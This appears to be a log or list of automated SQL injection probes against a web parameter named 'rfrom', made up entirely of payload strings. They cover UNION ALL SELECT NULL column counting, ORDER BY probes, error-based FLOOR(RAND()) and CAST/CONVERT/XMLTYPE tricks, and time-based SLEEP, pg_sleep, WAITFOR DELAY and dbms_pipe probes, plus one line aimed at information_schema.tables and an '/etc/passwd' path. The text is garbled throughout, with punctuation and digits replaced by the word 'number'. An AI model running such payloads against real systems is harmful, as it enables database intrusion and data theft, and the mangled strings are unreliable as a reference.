-/?rfrom=soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number order  number by  number   number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number order  number by  number   number 
-/?rfrom=soso  number union  number all  number select  number null  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
-/?rfrom=soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso
+ rfrom soso gdue  number d number   number and  number   number d number   number union  number all  number select  number   number c number   number c number   number ctable_name  number from  number information_schema.tables  number where  number   number e number     number ..  number f..  number f..  number fetc  number fpasswd
+ rfrom soso
+ rfrom  number 
+ rfrom  number 
+ rfrom soso  number   number c.  number c  number .  number .  number   number c
+ rfrom soso  number yoohmr  number c  number   number   number eauvhiv
+ rfrom soso  number   number and  number   number d number   number and  number   number   number d number 
+ rfrom soso  number   number and  number   number d number   number and  number   number   number d number 
+ rfrom soso  number and  number   number d number 
+ rfrom soso  number and  number   number d number 
+ rfrom soso  number   number   number and  number   number d number   number and  number   number   number rdui  number   number d  number rdui
+ rfrom soso  number   number   number and  number   number d number   number and  number   number   number pmug  number   number d  number pmug
+ rfrom soso  number   number and  number   number d number   number and  number   number qavb  number   number d  number qavb
+ rfrom soso  number   number and  number   number d number   number and  number   number ciyp  number   number d  number ciyp
+ rfrom soso  number   number   number and  number   number d number   number and  number   number   number   number   number d  number 
+ rfrom soso  number   number   number and  number   number d number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number d number     number anzy
+ rfrom soso  number and  number   number d number     number qmqd
+ rfrom soso  number and  number   number d number     number qmqd
+ rfrom   number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number a  number select  number   number from  number information_schema.character_sets  number   number end  number   number 
+ rfrom   number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number a  number select  number   number from  number information_schema.character_sets  number   number end  number   number 
+ rfrom soso  number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number   number d number 
+ rfrom soso  number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number 
+ rfrom soso  number   number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number   number hofw  number   number d  number hofw
+ rfrom soso  number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number gnof  number   number d  number gnof
+ rfrom soso  number   number   number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number     number aank
+ rfrom soso  number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number   number d number 
+ rfrom soso  number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number 
+ rfrom soso  number   number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number   number hmwr  number   number d  number hmwr
+ rfrom soso  number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number mfwy  number   number d  number mfwy
+ rfrom soso  number   number   number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number dcast  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number as  number numeric  number     number nefy
+ rfrom soso  number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number   number d number 
+ rfrom soso  number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number 
+ rfrom soso  number   number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number   number dihq  number   number d  number dihq
+ rfrom soso  number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number tnpc  number   number d  number tnpc
+ rfrom soso  number   number   number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number dconvert  number int  number c  number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number   number     number sywp
+ rfrom soso  number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number   number d number 
+ rfrom soso  number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number 
+ rfrom soso  number   number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number   number iobf  number   number d  number iobf
+ rfrom soso  number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number skvv  number   number d  number skvv
+ rfrom soso  number   number   number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number     number axtq
+ rfrom soso  number and  number   number d  number select  number upper  number xmltype  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number from  number dual  number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number   number from  number dual  number     number axtq
+ rfrom   number select  number   number from  number select  number count  number   number a  number   number cconcat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number cfloor  number rand  number   number   number a number   number   number x  number from  number information_schema.character_sets  number group  number by  number x  number a  number 
+ rfrom   number select  number concat  number x number b number   number c  number select  number   number elt  number   number d number   number c number   number   number   number   number c number x number a number a number   number   number 
+ rfrom   number select  number   number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number c  number c  number select  number   number case  number when  number   number   number d number   number   number then  number   number else  number   number end  number   number   number a  number atext  number c  number c  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number   number 
+ rfrom   number select  number char  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number b  number select  number   number case  number when  number   number   number d number   number   number then  number char  number   number   number else  number char  number   number   number end  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number bchar  number   number   number 
+ rfrom soso  number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
+ rfrom soso  number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
+ rfrom soso  number   number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
+ rfrom soso  number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
+ rfrom soso  number   number   number b  number select  number   number a  number from  number   number select  number sleep  number   number   number   number jvow  number   number 
+ rfrom soso  number   number bselect  number pg_sleep  number   number   
+ rfrom soso  number bselect  number pg_sleep  number   number   
+ rfrom soso  number   number   number bselect  number pg_sleep  number   number   
+ rfrom soso  number   number   number bselect  number pg_sleep  number   number   
+ rfrom soso  number   number bselect  number pg_sleep  number   number   
+ rfrom soso  number   number   number bselect  number pg_sleep  number   number   
+ rfrom soso  number   number bwaitfor  number delay  number   number   number a number   number a number   number   
+ rfrom soso  number bwaitfor  number delay  number   number   number a number   number a number   number   
+ rfrom soso  number   number   number bwaitfor  number delay  number   number   number a number   number a number   number   
+ rfrom soso  number   number bwaitfor  number delay  number   number   number a number   number a number   number   
+ rfrom soso  number   number   number bwaitfor  number delay  number   number   number a number   number a number   number   
+ rfrom soso  number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
+ rfrom soso  number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
+ rfrom soso  number   number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
+ rfrom soso  number   number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
+ rfrom soso  number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
+ rfrom soso  number   number   number bselect  number dbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number from  number dual  
+ rfrom soso  number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number   number d number 
+ rfrom soso  number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number 
+ rfrom soso  number   number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number   number xrec  number   number d  number xrec
+ rfrom soso  number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number ztlb  number   number d  number ztlb
+ rfrom soso  number   number   number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number select  number   number a  number from  number   number select  number sleep  number   number   number   number chpg  number     number jbme
+ rfrom soso  number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number   number d number 
+ rfrom soso  number and  number   number d  number select  number   number from  number pg_sleep  number   number   number 
+ rfrom soso  number   number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number   number qsnq  number   number d  number qsnq
+ rfrom soso  number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number vvjs  number   number d  number vvjs
+ rfrom soso  number   number   number and  number   number d  number select  number   number from  number pg_sleep  number   number   number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number d  number select  number   number from  number pg_sleep  number   number   number     number kayo
+ rfrom soso  number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number   number d number 
+ rfrom soso  number waitfor  number delay  number   number   number a number   number a number   number 
+ rfrom soso  number   number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number   number aszj  number   number d  number aszj
+ rfrom soso  number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number lhbc  number   number d  number lhbc
+ rfrom soso  number   number   number waitfor  number delay  number   number   number a number   number a number   number   number and  number   number   number   number   number d  number 
+ rfrom soso  number waitfor  number delay  number   number   number a number   number a number   number     number ovgj
+ rfrom soso  number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number   number d number 
+ rfrom soso  number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number 
+ rfrom soso  number   number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number   number ztfn  number   number d  number ztfn
+ rfrom soso  number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number hbue  number   number d  number hbue
+ rfrom soso  number   number   number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number   number and  number   number   number   number   number d  number 
+ rfrom soso  number and  number   number ddbms_pipe.receive_message  number chr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c  number cchr  number   number   number c number   number     number djnz
+ rfrom soso  number   number order  number by  number     number  
+ rfrom soso  number   number union  number all  number select  number null    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number order  number by  number     number  
+ rfrom soso  number union  number all  number select  number null    number  
+ rfrom soso  number union  number all  number select  number null  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number order  number by  number     number  
+ rfrom soso  number   number   number union  number all  number select  number null    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number order  number by  number     number  
+ rfrom soso  number   number union  number all  number select  number null    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number order  number by  number     number  
+ rfrom soso  number   number   number union  number all  number select  number null    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number order  number by  number     number  
+ rfrom soso  number union  number all  number select  number null    number  
+ rfrom soso  number union  number all  number select  number null  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull    number  
+ rfrom soso  number   number order  number by  number   number 
+ rfrom soso  number   number union  number all  number select  number null  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number order  number by  number   number 
+ rfrom soso  number order  number by  number   number 
+ rfrom soso  number union  number all  number select  number null  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number   number order  number by  number   number 
+ rfrom soso  number   number   number union  number all  number select  number null  number 
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number 
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number 
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number 
+ rfrom soso  number   number   number union  number all  number select  number null  number cnull  number cnull  number cnull  number cnull  number cnull  number 
